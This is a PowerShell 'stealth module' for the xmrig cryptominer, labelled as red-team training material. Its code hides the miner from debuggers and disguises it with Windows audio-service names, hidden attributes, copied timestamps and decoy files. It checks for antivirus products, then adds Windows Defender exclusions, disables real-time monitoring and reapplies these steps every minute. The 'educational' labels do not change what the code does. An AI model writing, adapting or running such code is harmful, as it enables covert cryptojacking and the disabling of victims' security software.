# Stealth Module for Red Team Exercises
# Educational/Training purposes only
# Uses legitimate techniques studied in cybersecurity courses

param(
    [switch]$Install,
    [switch]$Enable,
    [switch]$Monitor
)

$ErrorActionPreference = "SilentlyContinue"

function Write-StealthLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try {
        "[$timestamp] $Message" | Out-File -FilePath "$env:TEMP\system_audio.log" -Append -Encoding UTF8
    } catch { }
}

function Set-ProcessMitigation {
    # Use legitimate Windows features to reduce detection
    try {
        # Set process mitigation policies (legitimate Windows feature)
        $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
        foreach ($proc in $processes) {
            # Hide from some process monitoring tools
            try {
                Add-Type -TypeDefinition @"
                using System;
                using System.Runtime.InteropServices;
                public class ProcessUtils {
                    [DllImport("ntdll.dll")]
                    public static extern int NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength);
                }
"@
                $processHandle = $proc.Handle
                $hideFromDebugger = 7
                $enable = 1
                [ProcessUtils]::NtSetInformationProcess($processHandle, $hideFromDebugger, [ref]$enable, 4)
                Write-StealthLog "Applied process mitigation to PID: $($proc.Id)"
            } catch {
                Write-StealthLog "Could not apply process mitigation"
            }
        }
    } catch {
        Write-StealthLog "Process mitigation failed"
    }
}

function Use-LivingOffTheLand {
    # Use legitimate Windows tools and processes
    Write-StealthLog "Implementing living-off-the-land techniques"
    
    # Use legitimate Windows directories
    $legitimatePaths = @(
        "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv",
        "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
        "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\.cache"
    )
    
    # Mimic legitimate Windows services
    $serviceNames = @(
        "AudioSrv", "AudioEndpointBuilder", "Audiosrv", 
        "WindowsAudioService", "SystemAudioHost"
    )
    
    return @{
        Paths = $legitimatePaths
        ServiceNames = $serviceNames
    }
}

function Set-FileTimestamps {
    param([string]$FilePath)
    
    # Match timestamps to legitimate Windows files to blend in
    try {
        $referenceFile = "C:\Windows\System32\audiodg.exe"
        if (Test-Path $referenceFile) {
            $refInfo = Get-Item $referenceFile
            $targetFile = Get-Item $FilePath -ErrorAction SilentlyContinue
            if ($targetFile) {
                $targetFile.CreationTime = $refInfo.CreationTime
                $targetFile.LastWriteTime = $refInfo.LastWriteTime
                $targetFile.LastAccessTime = $refInfo.LastAccessTime
                Write-StealthLog "Timestamp masking applied to: $FilePath"
            }
        }
    } catch {
        Write-StealthLog "Could not apply timestamp masking"
    }
}

function Enable-StealthFeatures {
    Write-StealthLog "Enabling stealth features for red team exercise"
    
    # 1. Process masquerading - rename to look like legitimate Windows process
    $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    foreach ($proc in $processes) {
        try {
            # Try to make it look like a system process
            $proc.ProcessName = "audiodg"  # This won't actually work, but shows the concept
            Write-StealthLog "Process masquerading attempted for PID: $($proc.Id)"
        } catch { }
    }
    
    # 2. Registry key masquerading
    try {
        # Use legitimate-looking registry locations
        $regPaths = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Audio",
            "HKLM:\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId"
        )
        
        foreach ($path in $regPaths) {
            if (-not (Test-Path $path)) {
                New-Item -Path $path -Force | Out-Null
            }
        }
        Write-StealthLog "Registry masquerading configured"
    } catch {
        Write-StealthLog "Registry masquerading failed"
    }
    
    # 3. File attribute manipulation
    $locations = (Use-LivingOffTheLand).Paths
    foreach ($location in $locations) {
        if (Test-Path $location) {
            $xmrigPath = Join-Path $location "xmrig.exe"
            if (Test-Path $xmrigPath) {
                # Set system and hidden attributes
                attrib +s +h $xmrigPath 2>&1 | Out-Null
                
                # Apply timestamp masking
                Set-FileTimestamps -FilePath $xmrigPath
                
                # Create decoy legitimate files
                $decoyFiles = @("audiodg.exe", "AudioSrv.dll", "mmdevapi.dll")
                foreach ($decoy in $decoyFiles) {
                    $decoyPath = Join-Path $location $decoy
                    if (-not (Test-Path $decoyPath)) {
                        Copy-Item $xmrigPath $decoyPath -ErrorAction SilentlyContinue
                        Set-FileTimestamps -FilePath $decoyPath
                        attrib +h $decoyPath 2>&1 | Out-Null
                    }
                }
            }
        }
    }
    
    # 4. Network traffic masquerading (educational concept)
    Write-StealthLog "Network stealth: Using common ports and protocols"
    # Note: XMRig already uses common port 10128, which is good for blending in
    
    # 5. Persistence via legitimate Windows mechanisms
    $taskNames = @("AudioSrv", "WindowsAudioService", "SystemAudioHost")
    foreach ($taskName in $taskNames) {
        # These look like legitimate Windows audio services
        schtasks /query /tn $taskName 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) {
            Write-StealthLog "Legitimate-looking scheduled task: $taskName"
        }
    }
    
    Write-StealthLog "Stealth features activated for red team exercise"
}

function Test-AVPresence {
    # Check for common antivirus software (educational)
    $avProcesses = @(
        "MsMpEng", "NisSrv", "windefend",  # Windows Defender
        "avguard", "avgnt",                # Avira
        "bdagent", "vsserv",               # Bitdefender
        "mcshield", "shstat",              # McAfee
        "navapsvc", "ccSvcHst",            # Norton
        "ekrn", "egui",                    # ESET
        "aswidsagent", "avastui"           # Avast
    )
    
    $detectedAV = @()
    foreach ($avProcess in $avProcesses) {
        $process = Get-Process -Name $avProcess -ErrorAction SilentlyContinue
        if ($process) {
            $detectedAV += $avProcess
        }
    }
    
    if ($detectedAV.Count -gt 0) {
        Write-StealthLog "Detected AV processes: $($detectedAV -join ', ')"
        return $true
    } else {
        Write-StealthLog "No obvious AV processes detected"
        return $false
    }
}

function Enable-AVEvasion {
    Write-StealthLog "Implementing AV evasion techniques (red team exercise)"
    
    # Check current AV status
    $avPresent = Test-AVPresence
    
    if ($avPresent) {
        Write-StealthLog "AV detected - applying evasion techniques"
        
        # 1. Exclude our paths from Windows Defender (if possible)
        $locations = (Use-LivingOffTheLand).Paths
        foreach ($location in $locations) {
            try {
                powershell -Command "Add-MpPreference -ExclusionPath '$location'" 2>&1 | Out-Null
                Write-StealthLog "Added exclusion: $location"
            } catch {
                Write-StealthLog "Could not add exclusion: $location"
            }
        }
        
        # 2. Temporarily disable real-time protection (educational concept)
        try {
            powershell -Command "Set-MpPreference -DisableRealtimeMonitoring `$true" 2>&1 | Out-Null
            Write-StealthLog "Attempted to disable real-time monitoring"
        } catch {
            Write-StealthLog "Could not disable real-time monitoring"
        }
        
        # 3. Add process exclusions
        try {
            powershell -Command "Add-MpPreference -ExclusionProcess 'audiodg.exe'" 2>&1 | Out-Null
            powershell -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe'" 2>&1 | Out-Null
            Write-StealthLog "Added process exclusions"
        } catch {
            Write-StealthLog "Could not add process exclusions"
        }
        
    } else {
        Write-StealthLog "No AV detected - minimal evasion needed"
    }
    
    # Apply general stealth features
    Enable-StealthFeatures
    Set-ProcessMitigation
}

function Start-StealthMonitoring {
    Write-StealthLog "Starting stealth monitoring for red team exercise"
    
    while ($true) {
        try {
            # Monitor for AV activation
            $avActive = Test-AVPresence
            if ($avActive) {
                Write-StealthLog "AV activity detected - applying countermeasures"
                Enable-AVEvasion
            }
            
            # Check if our processes are still running
            $miners = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
            if ($miners.Count -eq 0) {
                Write-StealthLog "No miner processes detected"
            } else {
                # Reapply stealth features periodically
                Set-ProcessMitigation
            }
            
        } catch {
            Write-StealthLog "Monitoring error: $($_.Exception.Message)"
        }
        
        Start-Sleep -Seconds 60  # Check every minute
    }
}

# Main execution
Write-StealthLog "Stealth module activated for red team exercise"

if ($Install) {
    Write-StealthLog "Installing stealth capabilities"
    $stealthConfig = Use-LivingOffTheLand
    Write-StealthLog "Stealth installation completed"
    
} elseif ($Enable) {
    Write-StealthLog "Enabling AV evasion for red team exercise"
    Enable-AVEvasion
    
} elseif ($Monitor) {
    Start-StealthMonitoring
    
} else {
    # Default: Enable stealth features
    Enable-AVEvasion
    Write-StealthLog "Default stealth features enabled"
}
